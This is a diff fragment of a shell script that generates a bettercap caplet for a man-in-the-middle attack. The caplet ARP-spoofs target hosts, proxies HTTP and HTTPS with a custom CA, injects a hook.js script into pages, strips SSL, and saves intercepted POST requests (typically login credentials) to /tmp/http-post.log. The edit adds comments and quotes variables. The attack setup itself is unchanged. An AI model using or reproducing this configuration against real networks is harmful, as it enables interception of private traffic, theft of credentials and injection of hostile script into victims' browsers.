@@ -198,27 +198,37 @@ document.body.appendChild(iframe);
 EOF
 
 cat > "$MITM_DIR/fallback.cap" <<EOF
-set arp.spoof.targets $TARGETS
+# ARP spoofing config
+set arp.spoof.targets ${TARGETS}
 set arp.spoof.internal true
 arp.spoof on
 
-set https.proxy.certificate $CA_CERT_PEM
-set https.proxy.key $CA_KEY
+# HTTPS proxy with custom cert/key
+set https.proxy.certificate ${CA_CERT_PEM}
+set https.proxy.key ${CA_KEY}
 
-set http.proxy.script $MITM_DIR/hook.js
-set https.proxy.script $MITM_DIR/hook.js
+# Hook injection scripts
+set http.proxy.script ${MITM_DIR}/hook.js
+set https.proxy.script ${MITM_DIR}/hook.js
 
+# Enable HTTP & HTTPS proxies
 http.proxy on
 https.proxy on
 
+# Verbose logging of HTTP(S) requests
 set http.proxy.verbose true
 
+# Save only POST requests to file
 set events.stream.output /tmp/http-post.log
 set events.stream.filter "http.request and http.request.method == 'POST'"
 
+# SSL stripping (downgrade HTTPS to HTTP)
 set https.proxy.sslstrip true
 
+# Enable events logging
 events.stream on
+
+# Enable network probing
 net.probe on
 EOF
 
